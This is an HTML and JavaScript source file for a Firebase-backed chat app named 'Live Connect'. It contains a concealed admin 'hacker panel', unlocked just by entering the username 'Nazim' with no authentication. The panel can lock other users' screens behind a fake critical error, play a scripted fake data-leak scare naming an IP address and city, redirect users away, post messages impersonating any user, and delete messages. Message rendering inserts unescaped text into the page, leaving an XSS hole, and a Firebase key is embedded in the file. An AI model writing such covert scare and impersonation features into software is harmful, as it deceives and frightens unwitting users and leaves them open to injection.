<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Live Connect</title>
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.5.0/css/all.min.css">
    <style>
        :root { --bg: #0b0f19; --neon: #00ff41; --danger: #ff3e3e; --glass: rgba(17, 25, 40, 0.95); --border: rgba(255, 255, 255, 0.1); }
        body { margin: 0; font-family: 'Segoe UI', sans-serif; background: var(--bg); color: #e6edf3; overflow: hidden; }
        .app { max-width: 500px; margin: auto; height: 100vh; position: relative; display: flex; flex-direction: column; border: 1px solid var(--border); }
        
        header { padding: 15px; background: var(--glass); border-bottom: 1px solid var(--border); display: flex; justify-content: space-between; align-items: center; backdrop-filter: blur(10px); z-index: 100; }
        header h1 { margin: 0; font-size: 1.2rem; background: linear-gradient(90deg, #58a6ff, #bc8cff); -webkit-background-clip: text; -webkit-text-fill-color: transparent; font-weight: 800; }

        .page { display: none; padding: 20px; flex: 1; overflow-y: auto; padding-bottom: 180px; }
        .active { display: block; animation: fadeIn 0.4s; }
        @keyframes fadeIn { from { opacity: 0; transform: translateY(10px); } to { opacity: 1; transform: translateY(0); } }

        .card { background: var(--glass); border: 1px solid var(--border); padding: 15px; border-radius: 12px; margin-bottom: 10px; cursor: pointer; display: flex; justify-content: space-between; align-items: center; transition: 0.3s; }
        .card:hover { border-color: #58a6ff; background: rgba(88, 166, 255, 0.05); }

        .chat-box { display: flex; flex-direction: column; gap: 10px; }
        .msg { position: relative; padding: 10px 15px; border-radius: 18px; max-width: 80%; font-size: 14px; line-height: 1.4; box-shadow: 0 4px 10px rgba(0,0,0,0.2); }
        .msg.me { align-self: flex-end; background: #238636; color: white; border-bottom-right-radius: 2px; }
        .msg.other { align-self: flex-start; background: #21262d; border-bottom-left-radius: 2px; border: 1px solid var(--border); }
        .msg b { font-size: 10px; color: #8b949e; display: block; margin-bottom: 3px; text-transform: uppercase; }

        /* Hacker Controls */
        #hacker-panel { display: none; background: #000; border: 1px solid var(--danger); padding: 10px; margin: 10px; border-radius: 10px; flex-wrap: wrap; gap: 8px; box-shadow: 0 0 15px rgba(255, 62, 62, 0.3); }
        .hack-btn { flex: 1; min-width: 90px; padding: 8px; font-size: 10px; background: transparent; border: 1px solid var(--danger); color: var(--danger); cursor: pointer; font-weight: bold; transition: 0.2s; }
        .hack-btn:hover { background: var(--danger); color: white; }

        .input-area { position: absolute; bottom: 80px; width: 100%; padding: 15px; box-sizing: border-box; background: var(--bg); }
        .chat-input { width: 100%; background: #161b22; border: 1px solid var(--border); color: white; padding: 12px 20px; border-radius: 25px; outline: none; transition: 0.3s; }
        .chat-input:focus { border-color: #58a6ff; }

        nav { position: absolute; bottom: 0; width: 100%; height: 75px; background: var(--glass); border-top: 1px solid var(--border); display: flex; justify-content: space-around; align-items: center; }
        nav i { font-size: 20px; color: #8b949e; cursor: pointer; padding: 12px; transition: 0.3s; }
        nav i.active { color: #58a6ff; background: rgba(88, 166, 255, 0.1); border-radius: 15px; }

        /* Scare Overlay */
        #scare-ui { display:none; position:fixed; top:0; left:0; width:100%; height:100%; background:#000; z-index:99999; color:var(--neon); flex-direction:column; align-items:center; justify-content:center; padding: 30px; box-sizing: border-box; font-family: 'Courier New', monospace; overflow: hidden; }
        .matrix-text { font-size: 13px; width: 100%; }
        .del-btn { position: absolute; top: -5px; right: -5px; background: var(--danger); color: white; width: 18px; height: 18px; border-radius: 50%; font-size: 9px; display: none; align-items: center; justify-content: center; cursor: pointer; }
        .msg:hover .del-btn { display: flex; }
    </style>
</head>
<body>

<div id="scare-ui">
    <div id="matrix-content" class="matrix-text"></div>
</div>

<div class="app">
    <header>
        <h1>Live Connect</h1>
        <i class="fa-solid fa-circle-nodes" style="color:#58a6ff"></i>
    </header>

    <div id="loginPage" class="page active">
        <div style="text-align: center; margin-top: 60px;">
            <i class="fa-solid fa-comments" style="font-size: 60px; color: #58a6ff; margin-bottom: 20px;"></i>
            <h2>Join the Conversation</h2>
            <input type="text" id="usernameInput" class="chat-input" placeholder="Your codename..." style="text-align:center; margin-top:20px;">
            <button onclick="login()" style="width:100%; padding:15px; margin-top:25px; background:#238636; color:white; border:none; border-radius:25px; font-weight:bold; cursor:pointer; font-size: 16px;">CONNECT</button>
        </div>
    </div>

    <div id="home" class="page">
        <div class="card" onclick="startChat('global', false)">
            <div><b style="color:#58a6ff">Global Network</b><br><small>Public encrypted channel</small></div>
            <i class="fa-solid fa-globe"></i>
        </div>
        <p style="color:#8b949e; font-size: 12px; margin: 20px 5px 10px;">DIRECT TARGETS:</p>
        <div id="userList"></div>
    </div>

    <div id="chat" class="page">
        <div id="hacker-panel">
            <button class="hack-btn" onclick="executeHack('freeze')">Freeze Users</button>
            <button class="hack-btn" onclick="executeHack('scare')">Fake Data Leak</button>
            <button class="hack-btn" onclick="executeHack('hijack')">App Hijack</button>
            <button class="hack-btn" onclick="executeHack('unfreeze')" style="color:var(--neon); border-color:var(--neon)">Restore All</button>
        </div>
        <div id="chatBox" class="chat-box"></div>
        <div class="input-area">
            <input type="text" id="msgInput" class="chat-input" placeholder="Secure transmission...">
        </div>
    </div>

    <nav id="navbar" style="display:none">
        <i class="fa-solid fa-house active" onclick="openPage('home', this)"></i>
        <i class="fa-solid fa-message" onclick="openPage('chat', this)"></i>
        <i class="fa-solid fa-gear" onclick="alert('Settings Encrypted')"></i>
    </nav>
</div>

<script type="module">
import { initializeApp } from "https://www.gstatic.com/firebasejs/12.9.0/firebase-app.js";
import { getDatabase, ref, set, push, onValue, remove } from "https://www.gstatic.com/firebasejs/12.9.0/firebase-database.js";

const firebaseConfig = {
    apiKey: "AIzaSyCSD1O9tV7xDZu_kljq-0NMhA2DqtW5quE",
    authDomain: "live-chat-b810c.firebaseapp.com",
    databaseURL: "https://live-chat-b810c-default-rtdb.firebaseio.com",
    projectId: "live-chat-b810c"
};

const app = initializeApp(firebaseConfig);
const db = getDatabase(app);

let currentUser = null, curChat = "global", isPrivate = false;
const adminName = "Nazim"; 

window.login = () => {
    const val = document.getElementById("usernameInput").value.trim();
    if(!val) return;
    currentUser = val;
    document.getElementById("loginPage").style.display="none";
    document.getElementById("home").classList.add("active");
    document.getElementById("navbar").style.display="flex";
    
    if(currentUser === adminName) document.getElementById("hacker-panel").style.display="flex";

    // Power Listener: Detects if Admin has attacked this user
    onValue(ref(db, "powers/" + currentUser), snap => {
        const p = snap.val();
        if(p === "freeze") { 
            document.getElementById("scare-ui").style.display="flex"; 
            document.getElementById("matrix-content").innerHTML = "<h1>SYSTEM CRITICAL ERROR</h1><p>Manual Override Required. Device Locked.</p>"; 
        }
        if(p === "scare") { document.getElementById("scare-ui").style.display="flex"; runFakeLeak(); }
        if(p === "unfreeze") document.getElementById("scare-ui").style.display="none";
        if(p === "hijack") window.location.href = "https://www.google.com";
    });

    set(ref(db, "users/" + currentUser), { name: currentUser, online: true });
    syncUsers();
};

function runFakeLeak() {
    const lines = ["> INITIALIZING BRUTE FORCE...", "> ACCESSING KERNEL...", "> IP TRACE: 103.255.4.19", "> LOCATION: RAWALPINDI, PK", "> STEALING BROWSER COOKIES...", "> UPLOADING SENSITIVE DATA...", "> 100% COMPLETE. DATABASE LEAKED."];
    const el = document.getElementById("matrix-content"); el.innerHTML = "";
    let i = 0;
    let timer = setInterval(() => {
        el.innerHTML += lines[i] + "<br>"; i++;
        if(i >= lines.length) clearInterval(timer);
    }, 700);
}

window.startChat = (target, priv) => {
    curChat = priv ? [currentUser, target].sort().join("_") : "global";
    isPrivate = priv;
    openPage('chat');
    loadChat();
};

window.sendMsg = () => {
    const inp = document.getElementById("msgInput");
    const val = inp.value.trim();
    if(!val) return;

    // --- ADMIN GHOST COMMANDS ---
    if(currentUser === adminName && val.startsWith("/as ")) {
        const p = val.split(" ");
        const victim = p[1];
        const msg = val.replace("/as "+victim+" ", "");
        push(ref(db, "messages/global"), { from: victim, text: msg });
        inp.value = ""; return;
    }

    const path = isPrivate ? "private/" + curChat : "messages/global";
    push(ref(db, path), { from: currentUser, text: val });
    inp.value = "";
};

document.getElementById("msgInput").addEventListener("keypress", (e) => { if(e.key === 'Enter') sendMsg(); });

function loadChat() {
    const path = isPrivate ? "private/" + curChat : "messages/global";
    onValue(ref(db, path), snap => {
        const box = document.getElementById("chatBox"); box.innerHTML = "";
        snap.forEach(m => {
            const d = m.val();
            const div = document.createElement("div"); div.className = `msg ${d.from === currentUser ? 'me' : 'other'}`;
            div.innerHTML = `<b>${d.from}</b>${d.text} 
            ${(currentUser === adminName) ? `<i class="fa-solid fa-trash del-btn" onclick="remove(ref(db,'${path}/${m.key}'))"></i>` : ''}`;
            box.appendChild(div);
        });
        box.scrollTop = box.scrollHeight;
    });
}

function syncUsers() {
    onValue(ref(db, "users"), snap => {
        const list = document.getElementById("userList"); list.innerHTML = "";
        snap.forEach(u => {
            if(u.key !== currentUser) {
                let d = document.createElement("div"); d.className = "card";
                d.innerHTML = `<span>${u.key}</span> <i class="fa-solid fa-comment-dots" style="color:#58a6ff"></i>`;
                d.onclick = () => startChat(u.key, true);
                list.appendChild(d);
            }
        });
    });
}

window.executeHack = (act) => {
    onValue(ref(db, "users"), snap => {
        snap.forEach(u => { if(u.key !== adminName) set(ref(db, "powers/" + u.key), act); });
    }, {onlyOnce: true});
};

window.openPage = (id, icon) => {
    document.querySelectorAll('.page').forEach(p => p.classList.remove('active'));
    document.getElementById(id).classList.add('active');
    if(icon) {
        document.querySelectorAll('nav i').forEach(i => i.classList.remove('active'));
        icon.classList.add('active');
    }
};
</script>
</body>
</html>
